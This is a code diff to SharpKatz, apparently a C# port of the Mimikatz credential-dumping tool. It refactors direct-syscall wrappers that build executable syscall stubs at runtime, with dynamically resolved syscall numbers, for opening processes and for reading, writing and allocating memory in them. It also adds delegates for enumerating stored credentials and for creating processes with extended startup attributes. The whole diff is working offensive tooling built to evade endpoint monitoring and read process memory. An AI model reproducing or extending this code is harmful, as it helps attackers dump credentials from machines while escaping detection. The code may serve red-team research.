@@ -16,159 +16,99 @@ namespace SharpKatz.Win32
         const int memoryProtection = 0x40; // PAGE_EXECUTE_READWRITE
 
         /// <summary>
-        /// Generic method to execute a syscall via dynamically resolved SSN.
-        /// Builds the stub at runtime, pins it, marks executable, and invokes.
+        /// Prepare a syscall stub: resolve SSN, allocate executable memory, return address.
+        /// Caller MUST free the GCHandle in a finally block after invocation.
         /// </summary>
-        private static T ExecuteSyscall<T>(string ntFunction, Type delegateType, params object[] args) where T : struct
+        private static IntPtr PrepareSyscallStub(string ntFunction, out GCHandle pinnedHandle)
         {
             byte[] stub = SsnResolver.BuildSyscallStub(ntFunction);
+            pinnedHandle = GCHandle.Alloc(stub, GCHandleType.Pinned);
+            IntPtr addr = pinnedHandle.AddrOfPinnedObject();
 
-            GCHandle pinnedArray = GCHandle.Alloc(stub, GCHandleType.Pinned);
-            IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();
-
-            try
+            if (!Natives.VirtualProtect(addr, (UIntPtr)stub.Length, memoryProtection, out _))
             {
-                if (!Natives.VirtualProtect(memoryAddress,
-                    (UIntPtr)stub.Length, memoryProtection, out uint oldprotect))
-                {
-                    throw new Win32Exception();
-                }
-
-                Delegate syscallDelegate = Marshal.GetDelegateForFunctionPointer(memoryAddress, delegateType);
-                object result = syscallDelegate.DynamicInvoke(args);
-
-                return (T)result;
+                pinnedHandle.Free();
+                throw new Win32Exception();
             }
-            finally
-            {
-                pinnedArray.Free();
-            }
+
+            return addr;
         }
 
         public static NTSTATUS ZwOpenProcess10(ref IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)
         {
-            byte[] stub = SsnResolver.BuildSyscallStub("ZwOpenProcess");
-
-            GCHandle pinnedArray = GCHandle.Alloc(stub, GCHandleType.Pinned);
-            IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();
-
-            if (!Natives.VirtualProtect(memoryAddress,
-                (UIntPtr)stub.Length, memoryProtection, out uint oldprotect))
+            IntPtr addr = PrepareSyscallStub("ZwOpenProcess", out GCHandle pin);
+            try
             {
-                throw new Win32Exception();
+                var fn = (Delegates.ZwOpenProcess)Marshal.GetDelegateForFunctionPointer(addr, typeof(Delegates.ZwOpenProcess));
+                return (NTSTATUS)fn(out hProcess, processAccess, objAttribute, ref clientid);
             }
-
-            Delegates.ZwOpenProcess myAssemblyFunction = (Delegates.ZwOpenProcess)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwOpenProcess));
-
-            return (NTSTATUS)myAssemblyFunction(out hProcess, processAccess, objAttribute, ref clientid);
+            finally { pin.Free(); }
         }
 
         public static NTSTATUS ZwClose10(IntPtr handle)
         {
-            byte[] stub = SsnResolver.BuildSyscallStub("ZwClose");
-
-            GCHandle pinnedArray = GCHandle.Alloc(stub, GCHandleType.Pinned);
-            IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();
-
-            if (!Natives.VirtualProtect(memoryAddress,
-                (UIntPtr)stub.Length, memoryProtection, out uint oldprotect))
+            IntPtr addr = PrepareSyscallStub("ZwClose", out GCHandle pin);
+            try
             {
-                throw new Win32Exception();
+                var fn = (Delegates.ZwClose)Marshal.GetDelegateForFunctionPointer(addr, typeof(Delegates.ZwClose));
+                return (NTSTATUS)fn(handle);
             }
-
-            Delegates.ZwClose myAssemblyFunction = (Delegates.ZwClose)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwClose));
-
-            return (NTSTATUS)myAssemblyFunction(handle);
+            finally { pin.Free(); }
         }
 
         public static NTSTATUS ZwQuerySystemInformation10(SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, ref uint ReturnLength)
         {
-            byte[] stub = SsnResolver.BuildSyscallStub("ZwQuerySystemInformation");
-
-            GCHandle pinnedArray = GCHandle.Alloc(stub, GCHandleType.Pinned);
-            IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();
-
-            if (!Natives.VirtualProtect(memoryAddress,
-                (UIntPtr)stub.Length, memoryProtection, out uint oldprotect))
+            IntPtr addr = PrepareSyscallStub("ZwQuerySystemInformation", out GCHandle pin);
+            try
             {
-                throw new Win32Exception();
+                var fn = (Delegates.ZwQuerySystemInformation)Marshal.GetDelegateForFunctionPointer(addr, typeof(Delegates.ZwQuerySystemInformation));
+                return (NTSTATUS)fn(SystemInformationClass, SystemInformation, SystemInformationLength, ref ReturnLength);
             }
-
-            Delegates.ZwQuerySystemInformation myAssemblyFunction = (Delegates.ZwQuerySystemInformation)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwQuerySystemInformation));
-
-            return (NTSTATUS)myAssemblyFunction(SystemInformationClass, SystemInformation, SystemInformationLength, ref ReturnLength);
+            finally { pin.Free(); }
         }
 
         public static NTSTATUS NtReadVirtualMemory10(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, int NumberOfBytesToRead, int NumberOfBytesRead)
         {
-            byte[] stub = SsnResolver.BuildSyscallStub("NtReadVirtualMemory");
-
-            GCHandle pinnedArray = GCHandle.Alloc(stub, GCHandleType.Pinned);
-            IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();
-
-            if (!Natives.VirtualProtect(memoryAddress,
-                (UIntPtr)stub.Length, memoryProtection, out uint oldprotect))
+            IntPtr addr = PrepareSyscallStub("NtReadVirtualMemory", out GCHandle pin);
+            try
             {
-                throw new Win32Exception();
+                var fn = (Delegates.NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(addr, typeof(Delegates.NtReadVirtualMemory));
+                return (NTSTATUS)fn(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesRead);
             }
-
-            Delegates.NtReadVirtualMemory myAssemblyFunction = (Delegates.NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtReadVirtualMemory));
-
-            return (NTSTATUS)myAssemblyFunction(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesRead);
+            finally { pin.Free(); }
         }
 
         public static NTSTATUS NtWriteVirtualMemory10(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)
         {
-            byte[] stub = SsnResolver.BuildSyscallStub("NtWriteVirtualMemory");
-
-            GCHandle pinnedArray = GCHandle.Alloc(stub, GCHandleType.Pinned);
-            IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();
-
-            if (!Natives.VirtualProtect(memoryAddress,
-                (UIntPtr)stub.Length, memoryProtection, out uint oldprotect))
+            IntPtr addr = PrepareSyscallStub("NtWriteVirtualMemory", out GCHandle pin);
+            try
             {
-                throw new Win32Exception();
+                var fn = (Delegates.ZwWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(addr, typeof(Delegates.ZwWriteVirtualMemory));
+                return (NTSTATUS)fn(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
             }
-
-            Delegates.ZwWriteVirtualMemory myAssemblyFunction = (Delegates.ZwWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwWriteVirtualMemory));
-
-            return (NTSTATUS)myAssemblyFunction(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
+            finally { pin.Free(); }
         }
 
         public static NTSTATUS NtAllocateVirtualMemory10(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect)
         {
-            byte[] stub = SsnResolver.BuildSyscallStub("NtAllocateVirtualMemory");
-
-            GCHandle pinnedArray = GCHandle.Alloc(stub, GCHandleType.Pinned);
-            IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();
-
-            if (!Natives.VirtualProtect(memoryAddress,
-                (UIntPtr)stub.Length, memoryProtection, out uint oldprotect))
+            IntPtr addr = PrepareSyscallStub("NtAllocateVirtualMemory", out GCHandle pin);
+            try
             {
-                throw new Win32Exception();
+                var fn = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(addr, typeof(Delegates.NtAllocateVirtualMemory));
+                return (NTSTATUS)fn(hProcess, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
             }
-
-            Delegates.NtAllocateVirtualMemory myAssemblyFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory));
-
-            return (NTSTATUS)myAssemblyFunction(hProcess, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
+            finally { pin.Free(); }
         }
 
         public static NTSTATUS NtFreeVirtualMemory10(IntPtr hProcess, ref IntPtr BaseAddress, ref uint RegionSize, ulong FreeType)
         {
-            byte[] stub = SsnResolver.BuildSyscallStub("NtFreeVirtualMemory");
-
-            GCHandle pinnedArray = GCHandle.Alloc(stub, GCHandleType.Pinned);
-            IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();
-
-            if (!Natives.VirtualProtect(memoryAddress,
-                (UIntPtr)stub.Length, memoryProtection, out uint oldprotect))
+            IntPtr addr = PrepareSyscallStub("NtFreeVirtualMemory", out GCHandle pin);
+            try
             {
-                throw new Win32Exception();
+                var fn = (Delegates.NtFreeVirtualMemory)Marshal.GetDelegateForFunctionPointer(addr, typeof(Delegates.NtFreeVirtualMemory));
+                return (NTSTATUS)fn(hProcess, ref BaseAddress, ref RegionSize, FreeType);
             }
-
-            Delegates.NtFreeVirtualMemory myAssemblyFunction = (Delegates.NtFreeVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtFreeVirtualMemory));
-
-            return (NTSTATUS)myAssemblyFunction(hProcess, ref BaseAddress, ref RegionSize, FreeType);
+            finally { pin.Free(); }
         }
 
         public struct Delegates
@@ -548,6 +488,41 @@ namespace SharpKatz.Win32
             [SuppressUnmanagedCodeSecurity]
             [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
             public delegate bool GetFileAttributesExW(string lpFileName, GET_FILEEX_INFO_LEVELS fInfoLevelId, ref WIN32_FILE_ATTRIBUTE_DATA lpFileInformation);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+            public delegate bool LookupAccountSidW(
+                IntPtr lpSystemName, IntPtr Sid, IntPtr lpName, ref int cchName,
+                IntPtr ReferencedDomainName, ref int cchReferencedDomainName, ref int peUse);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+            public delegate bool ConvertSidToStringSidW(IntPtr Sid, ref IntPtr StringSid);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate IntPtr LocalFree(IntPtr hMem);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+            public delegate bool CredEnumerateW(
+                string filter, int flags, ref int count, ref IntPtr credentials);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate void CredFree(IntPtr buffer);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+            public delegate bool CreateProcessW(
+                string lpApplicationName, string lpCommandLine,
+                ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes,
+                bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment,
+                string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate void DeleteProcThreadAttributeList(IntPtr lpAttributeList);
         }
     }
 }
